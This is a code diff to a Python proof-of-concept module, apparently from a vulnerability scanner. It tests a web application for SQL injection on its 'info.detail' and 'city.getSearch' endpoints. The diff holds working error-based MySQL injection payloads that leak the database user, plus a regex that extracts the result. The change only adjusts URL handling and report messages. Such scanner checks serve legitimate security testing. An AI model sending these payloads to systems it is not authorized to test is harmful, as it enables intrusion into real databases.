@@ -47,21 +47,20 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            vulurl = '{target}'.format(target=self.target)
             payload = "/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
-            resp = requests.get(vulurl + payload)
+            resp = requests.get(self.target + payload)
             re_result = re.findall(r'~~~(.*?)~~~', resp.text, re.S | re.I)
-            vulurl1 = "%s/?m=city.getSearch&index=xx" % vulurl
+            vulurl1 = "%s/?m=city.getSearch&index=xx" % self.target
             payload1 = {
                 "key": "xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"}
             resp1 = requests.post(vulurl1, data=payload1)
             re_result1 = re.findall(r'~~~(.*?)~~~', resp1.text, re.S | re.I)
             if re_result:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=self.target + payload))
             if re_result1:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=vulurl1))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
